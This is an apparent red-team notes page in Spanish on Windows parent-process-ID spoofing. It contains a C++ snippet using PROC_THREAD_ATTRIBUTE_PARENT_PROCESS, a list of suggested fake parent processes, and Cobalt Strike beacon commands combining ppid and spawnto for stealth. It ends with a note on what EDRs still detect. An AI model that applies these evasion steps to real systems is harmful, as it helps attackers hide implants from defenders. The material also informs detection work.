---
tags: [opsec, evasion, ppid, spoofing, process]
status: done
platform: windows
---

# PPID Spoofing

> Falsificar el proceso padre del beacon para evitar detecciones basadas en correlación de árbol de procesos.

---

## Concepto

Cuando creamos un proceso, Windows permite especificar un proceso padre arbitrario via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. El proceso hijo hereda características del padre falso (permisos, tokens) y aparece en el árbol de procesos como hijo de ese proceso "legítimo".

---

## Selección del Proceso Padre

**Criterios para elegir un buen padre:**
1. Proceso que ya está ejecutando en el sistema (no crear uno nuevo)
2. Relevante para el contexto (ej: para un beacon en Office → Word.exe o svchost.exe)
3. Con privilegios apropiados (un padre con más privilegios puede elevar al hijo)
4. Con larga vida esperada (no un proceso que se cierre pronto)

**Candidatos buenos:**
- `explorer.exe` — padre natural de muchas cosas lanzadas por el usuario
- `svchost.exe` — común para servicios y procesos de sistema
- `dllhost.exe` — COM surrogate, normal en sistemas Windows
- `spoolsv.exe` — si necesitamos contexto de servicio

---

## Implementación en C++

```c
// 1. Abrir el proceso padre deseado
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);

// 2. Configurar atributos de proceso
SIZE_T attrSize;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize);

// 3. Especificar el padre falso
UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                          &hParent, sizeof(HANDLE), NULL, NULL);

// 4. Crear proceso con el padre falso
STARTUPINFOEX siEx = {};
siEx.StartupInfo.cb = sizeof(siEx);
siEx.lpAttributeList = attrList;

CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
              EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
              NULL, NULL, &siEx.StartupInfo, &pi);
```

---

## En Cobalt Strike

```
# Especificar PPID para el próximo fork & run
beacon> ppid <PID_del_proceso_padre>

# O configurar globalmente en el perfil Malleable C2
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
}
```

---

## Combinación con spawnto

```
# En CS — combo PPID + spawnto para máximo sigilo
beacon> ppid 1234              # PID de explorer.exe
beacon> spawnto x64 c:\windows\sysnative\dllhost.exe
beacon> execute-assembly tool.exe   # Se ejecuta en dllhost.exe con padre explorer.exe
```

---

## OPSEC

> ⚠️ El PPID spoofing es visible a nivel de kernel para los EDRs avanzados que correlacionan:
> - IntegrityLevel del padre vs hijo (anomalía si no coincide)
> - Token del padre vs hijo
> - Registro de llamada a UpdateProcThreadAttribute (ETW)
>
> No es magia, pero engaña bien a detecciones basadas en árbol de procesos simple.

